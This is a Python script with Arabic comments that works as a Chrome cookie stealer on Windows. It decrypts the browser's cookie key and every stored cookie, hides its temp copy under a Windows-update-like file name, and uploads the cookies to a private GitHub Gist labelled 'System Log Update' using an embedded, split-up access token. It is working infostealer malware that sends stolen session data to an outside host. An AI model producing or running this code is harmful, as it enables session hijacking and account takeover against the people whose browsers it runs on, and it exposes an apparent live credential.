import os, json, base64, sqlite3, shutil, requests, time

# التوكن المقسم (صلاحية Gist فقط)
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
GIST_TOKEN = A + B + C

def mirror_grabber():
    local_data = os.getenv('LOCALAPPDATA')
    state_file = os.path.join(local_data, r'Google\Chrome\User Data\Local State')
    cookies_file = os.path.join(local_data, r'Google\Chrome\User Data\Default\Network\Cookies')
    
    if not os.path.exists(cookies_file): return

    # تمويه الملف المؤقت
    shadow_db = os.path.join(os.getenv('TEMP'), 'win_update_svc.tmp')
    
    try:
        import win32crypt
        from Crypto.Cipher import AES
        
        shutil.copy2(cookies_file, shadow_db)
        
        with open(state_file, "r", encoding="utf-8") as f:
            secret_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            decrypted_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        
        db_conn = sqlite3.connect(shadow_db)
        cursor = db_conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        extracted_cookies = ""
        for host, name, value in cursor.fetchall():
            try:
                iv, payload = value[3:15], value[15:]
                cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
                dec_value = cipher.decrypt(payload)[:-16].decode()
                # صيغة Netscape مباشرة
                extracted_cookies += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{dec_value}\n"
            except: continue
        
        db_conn.close()
        os.remove(shadow_db)

        # إرسال البيانات إلى Gist (طريقة الهكرز المضمونة)
        if extracted_cookies:
            headers = {"Authorization": f"token {GIST_TOKEN}"}
            gist_payload = {
                "description": "System Log Update",
                "public": False, # ليكون سرياً لا يراه أحد غيرك
                "files": {
                    "cookies_decrypted.txt": {
                        "content": extracted_cookies
                    }
                }
            }
            # إنشاء Gist جديد في كل مرة
            requests.post("https://api.github.com/gists", headers=headers, json=gist_payload)
            
    except: pass

if __name__ == "__main__":
    mirror_grabber()
    
